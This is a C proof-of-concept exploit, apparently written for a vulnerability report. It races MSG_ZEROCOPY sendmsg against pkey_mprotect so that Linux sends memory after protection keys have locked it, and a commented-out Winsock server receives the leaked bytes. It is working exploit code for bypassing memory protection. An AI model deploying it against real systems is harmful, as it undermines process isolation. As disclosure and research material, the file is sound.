#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <pthread.h>
#include <sys/poll.h>
 
static inline void wrpkru(unsigned int pkru)
{
    unsigned int ecx = 0, edx = 0;
    asm volatile(".byte 0x0f,0x01,0xef\n\t"
             : : "a" (pkru), "c"(ecx), "d"(edx));
}
 
int k;
 
void set_new_data(char* data) {
    wrpkru(0x55555550);
    // we expect sendmsg to be executed here, so it pass the kernel check.
    // we could send *many signal* to slow down this thread, so we can be
    // lucky to have the sendmsg executed before the pkey_mprotect.
    pkey_mprotect(data, 4096, PROT_READ | PROT_WRITE, k);
    // we mprotect the data first, then write "New Hello, World" to it
    // if we can receive the data, it means the network stack is reading 
    // the data after the memory is put to protection.
    // and that's what we seen on the server.
    strcpy(data + 2048, "New Hello, World!");
    // data written here and before nic actaully read it, will be sent to the server.
}
 
pthread_attr_t      attr;
pthread_t           thread;
 
int main() {
    k = pkey_alloc(0, 0);
    char* data = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    strcpy(data, "Hello, World!");
 
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(23456);
    // set ip to 10.0.0.86
    addr.sin_addr.s_addr = htonl(0x0a000056);
 
    int val = 1;
 
    if (setsockopt(sockfd, SOL_SOCKET, SO_ZEROCOPY, &val, sizeof(val)) < 0) {
        perror("setsockopt");
        return 1;
    }
 
    printf("Set SO_ZEROCOPY\n");
 
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        return 1;
    }
 
    printf("Connected\n");
 
    // send data
    struct iovec iov;
    iov.iov_base = data;
    iov.iov_len = 4096;
 
    struct msghdr hdr;
    hdr.msg_iov = &iov;
    hdr.msg_iovlen = 1;
 
    wrpkru(0x5555555c);
    // if we have the pkey_mprotect here, it is going to fail.
    // pkey_mprotect(data, 4096, PROT_READ | PROT_WRITE, k);
    // but.. it it's async, it *may* pass the check.
    pthread_create(&thread, &attr, (void*(*)(void*))set_new_data, data);
    
    // kernel will check the address using `check_vma_flags`
    // if the address is not readable at the time, it will return failed.
    // but once the check is passed, the *physical memory* instead of the vm
    // will be read by the network stack, bypassing the protection.
    // And, this is a async operation, so it delay the data transmission,
    // based on the network stack's, and while this waiting,
    // there is going to be no lock to prevent vma flags change, or
    // data being written to the memory.
    int ret = sendmsg(sockfd, &hdr, MSG_ZEROCOPY);
    if (ret < 0) {
        perror("send");
    }
    printf("Done.");
    close(sockfd);
}
 
/*
// Sserver code, you need to set the firewall and etc to actually use it
// tcp server
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <winsock2.h>
#include <thread>
#include <vector>
#include <mutex>
 
char buf[4096];
 
int main() {
    // create a server and listen to 23456 port
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    int wsOK = WSAStartup(ver, &wsData);
    if (wsOK != 0) {
        std::cerr << "Can't initialize winsock! Quitting" << std::endl;
        return -1;
    }
 
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    if (listening == INVALID_SOCKET) {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        return -1;
    }
 
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(23456);
    hint.sin_addr.S_un.S_addr = INADDR_ANY;
 
    bind(listening, (sockaddr*)&hint, sizeof(hint));
 
    listen(listening, SOMAXCONN);
 
    fd_set master;
    FD_ZERO(&master);
    FD_SET(listening, &master);
    printf("Listening on port 23456\n");
    while (true) {
        fd_set copy = master;
        int socketCount = select(0, &copy, nullptr, nullptr, nullptr);
 
        for (int i = 0; i < socketCount; i++) {
            SOCKET sock = copy.fd_array[i];
            printf("Socket: %lld\n", sock);
            if (sock == listening) {
                SOCKET client = accept(listening, nullptr, nullptr);
                printf("Accept: %lld\n", client);
                FD_SET(client, &master);
            }
            else {
                ZeroMemory(buf, 4096);
                int tot = 0;
                while (tot < 4096) {
                    int bytesIn = recv(sock, buf + tot, 4096 - tot, 0);
                    if (bytesIn <= 0) {
                        closesocket(sock);
                        FD_CLR(sock, &master);
                        break;
                    }
                    tot += bytesIn;
                }
                printf("Recv+0: %s\n", buf);
                printf("Recv+2048: %s\n", buf + 2048); // we're expecting "New Hello, World!" here
            }
        }
    }
}
 
*/